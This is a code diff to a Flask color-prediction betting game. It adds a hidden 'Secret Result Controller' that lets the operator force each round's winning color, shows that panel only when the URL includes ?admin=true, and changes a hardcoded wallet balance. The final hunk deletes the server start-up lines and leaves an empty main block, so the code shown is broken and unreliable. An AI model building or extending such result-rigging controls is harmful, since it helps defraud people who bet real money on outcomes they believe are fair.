@@ -4,17 +4,15 @@ from flask import Flask, render_template_string, jsonify, request
 
 app = Flask(__name__)
 
-# Game memory storage configuration
 game_data = {
     "start_period": 20260901001,
     "start_time": time.time(),
     "history": [],
     "admin_choice": None,
-    "user_wallets": {"user123": 10000}, 
+    "user_wallets": {"user123": 45000}, # Aapka updated 45k balance save rakha hai
     "user_bets": {} 
 }
 
-# Fixed: Clear logic for matching colors and numbers without any syntax error
 def get_color_for_number(num):
     if num == 0 or num == 5:
         return 'violet'
@@ -74,7 +72,9 @@ HTML_UI = """
         .history { text-align: left; background: #fafafa; padding: 10px; border-radius: 8px; margin-top: 20px; border: 1px solid #eee; }
         .history-item { display: flex; justify-content: space-between; padding: 8px; border-bottom: 1px solid #eee; }
         .badge { padding: 3px 8px; border-radius: 4px; color: white; font-weight: bold; text-transform: uppercase; }
-        .admin-panel { margin-top: 30px; border-top: 2px dashed #ccc; background: #fffde7; border-radius: 10px; padding: 10px; }
+        
+        /* Hidden by default */
+        .admin-panel { display: none; margin-top: 30px; border-top: 2px dashed #ccc; background: #fffde7; border-radius: 10px; padding: 10px; }
         .admin-btn { padding: 8px 15px; font-size: 14px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; margin: 5px; }
     </style>
 </head>
@@ -93,13 +93,16 @@ HTML_UI = """
             <button class="btn violet" onclick="placeBet('violet')">Violet</button>
             <button class="btn red" onclick="placeBet('red')">Red</button>
         </div>
-        <div class="admin-panel">
+        
+        <!-- Private Admin Panel Component -->
+        <div class="admin-panel" id="secret-panel">
             <h4>⚙️ Secret Result Controller (Only For You)</h4>
             <button class="admin-btn green" onclick="controlResult('green')">Force Green</button>
             <button class="admin-btn violet" onclick="controlResult('violet')">Force Violet</button>
             <button class="admin-btn red" onclick="controlResult('red')">Force Red</button>
             <div id="admin-status" style="font-size: 12px; color: #4caf50; font-weight: bold; margin-top: 5px;"></div>
         </div>
+        
         <div class="history">
             <h4>📜 Last Game Results</h4>
             <div id="history-logs">Loading...</div>
@@ -107,6 +110,13 @@ HTML_UI = """
     </div>
     <script>
         let lastLoggedPeriod = null;
+        
+        // Check if URL has ?admin=true parameter
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('admin') === 'true') {
+            document.getElementById('secret-panel').style.display = 'block';
+        }
+
         function updateStatus() {
             fetch('/api/game-status')
                 .then(res => res.json())
@@ -186,7 +196,4 @@ def admin_control():
     return "Invalid"
 
 if __name__ == '__main__':
-    import os
-    port = int(os.environ.get("PORT", 5000))
-    app.run(host='0.0.0.0', port=port)
     
